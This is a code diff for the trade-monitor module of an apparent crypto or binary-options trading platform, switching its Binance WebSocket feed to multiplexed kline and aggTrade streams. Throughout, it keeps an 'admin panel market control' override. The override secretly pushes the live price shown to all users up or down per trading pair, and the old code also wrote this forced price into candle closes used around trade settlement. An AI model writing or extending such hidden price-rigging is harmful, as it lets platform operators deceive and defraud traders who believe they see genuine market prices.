@@ -104,73 +104,93 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
     const lastProcessedActivationTs = {};
     let lastCopyTradeCleanup = Date.now();
 
-    // Create Binance Streams URL for all pairs
-    const streams = TRADE_PAIRS.map(p => `${p.toLowerCase()}@kline_1m`).join('/');
-    const wsUrl = `wss://stream.binance.com:9443/ws/${streams}`;
+    // Cache the index module to avoid circular dependency and improve performance
+    let indexModule = {};
+    try {
+        indexModule = require('./index');
+    } catch (e) {
+        console.warn("Could not load index.js for overrides.");
+    }
+
+    // 🚀 NEW: Combine Kline (1m chart/settlement) AND AggTrade (Ultra-Fast Ticks)
+    const streams = TRADE_PAIRS.map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade`).join('/');
+    // Use multiplexing URL format for multiple streams
+    const wsUrl = `wss://stream.binance.com:9443/stream?streams=${streams}`;
     
     let ws = new WebSocket(wsUrl);
 
     ws.on('open', () => {
-        console.log('✅ Connected to Binance WebSockets for Live Market Data & Trades');
+        console.log('✅ Connected to Binance WebSockets for Live Market Data & Ultra-Fast Ticks');
     });
 
-    ws.on('message', async (data) => {
+    ws.on('message', async (message) => {
         try {
-            const parsed = JSON.parse(data);
-            if (parsed.e === 'kline') {
-                const pair = parsed.s; 
-                const k = parsed.k;
+            const parsedRaw = JSON.parse(message);
+            // Multiplexed streams wrap the data inside a 'data' object
+            const parsed = parsedRaw.data ? parsedRaw.data : parsedRaw;
+
+            if (!parsed) return;
+
+            // ==========================================
+            // 1. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
+            // ==========================================
+            if (parsed.e === 'aggTrade') {
+                const pair = parsed.s;
+                let currentPrice = parseFloat(parsed.p);
+
+                // --- ADMIN PANEL MARKET CONTROL ---
+                const overrides = indexModule.candleOverride || {};
                 
-                let currentPrice = parseFloat(k.c);
-                const openPrice = parseFloat(k.o);
+                if (overrides[pair] === 'up') currentPrice += (currentPrice * 0.0005); 
+                else if (overrides[pair] === 'down') currentPrice -= (currentPrice * 0.0005); 
 
-                // --- ADMIN PANEL MARKET CONTROL LOGIC ---
-                // Import here dynamically to avoid Circular Dependency Path Error
-                const { candleOverride } = require('./index'); 
-                const overrides = candleOverride || {};
-
-                if (overrides[pair] === 'up') {
-                    // Force UP: Ensure close is artificially higher than open
-                    currentPrice = openPrice + (openPrice * 0.0005); 
-                } else if (overrides[pair] === 'down') {
-                    // Force DOWN: Ensure close is artificially lower than open
-                    currentPrice = openPrice - (openPrice * 0.0005); 
+                if (!globalMarketData[pair]) {
+                    globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
                 }
 
+                globalMarketData[pair].currentPrice = currentPrice;
+
+                // Throttling: Frontend par lagatar updates bhej kar server hang hone se bachana (Max 4 ticks per second = 250ms)
+                const now = Date.now();
+                if (now - (globalMarketData[pair].lastEmit || 0) > 250) {
+                    io.emit('price_update', { pair, price: currentPrice, timestamp: now });
+                    globalMarketData[pair].lastEmit = now;
+                }
+            }
+
+            // ==========================================
+            // 2. CANDLESTICK DATA & SETTLEMENT (kline)
+            // ==========================================
+            else if (parsed.e === 'kline') {
+                const pair = parsed.s; 
+                const k = parsed.k;
+                const openPrice = parseFloat(k.o);
+
                 const candleObj = {
-                    timestamp: new Date(k.t), // Start time of candle
+                    timestamp: new Date(k.t),
                     open: openPrice,
                     high: parseFloat(k.h),
                     low: parseFloat(k.l),
-                    close: currentPrice, // Manipulated or real price
+                    close: parseFloat(k.c), // Keep exact kline close for accurate history
                     isClosed: k.x
                 };
 
-                // Initialize global state for this pair if not exists
-                if (!globalMarketData[pair]) {
-                    globalMarketData[pair] = { candles: [], currentCandle: null };
-                }
-                
-                // Update Global Market Data instantly
+                if (!globalMarketData[pair]) globalMarketData[pair] = { candles: [], currentCandle: null };
                 globalMarketData[pair].currentCandle = candleObj;
 
-                // Broadcast live manipulated/real price to all connected frontend clients
-                io.emit('price_update', { pair, price: currentPrice, timestamp: Date.now() });
-
-                // --- ACTIVATION LOGIC ---
+                // ACTIVATION LOGIC
                 const activationTs = candleObj.timestamp.getTime();
                 if (!lastProcessedActivationTs[pair] || lastProcessedActivationTs[pair] < activationTs) {
-                    await activateScheduledTradesForPair(io, Trade, pair, candleObj.timestamp, candleObj.open);
-                    await activatePendingTradesForPair(io, User, Trade, pair, candleObj.timestamp, candleObj.open);
+                    await activateScheduledTradesForPair(io, Trade, pair, candleObj.timestamp, openPrice);
+                    await activatePendingTradesForPair(io, User, Trade, pair, candleObj.timestamp, openPrice);
                     lastProcessedActivationTs[pair] = activationTs;
                 }
 
-                // --- SETTLEMENT LOGIC (When Candle Closes) ---
-                if (k.x) { // k.x is true when the 1-minute candle officially closes
+                // SETTLEMENT LOGIC (When Candle Closes)
+                if (k.x) { 
                     if (!globalMarketData[pair].candles) globalMarketData[pair].candles = [];
                     globalMarketData[pair].candles.push(candleObj);
                     
-                    // Keep memory clean (last 50 candles max)
                     if (globalMarketData[pair].candles.length > 50) {
                         globalMarketData[pair].candles.shift();
                     }
@@ -182,7 +202,7 @@ function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
                     }
                 }
 
-                // --- Copy Trade Cleanup (Check every 5 seconds) ---
+                // Copy Trade Cleanup (Check every 5 seconds)
                 const now = Date.now();
                 if ((now - lastCopyTradeCleanup) > 5000) {
                     await cleanupExpiredCopyTrades(io, User, Trade);
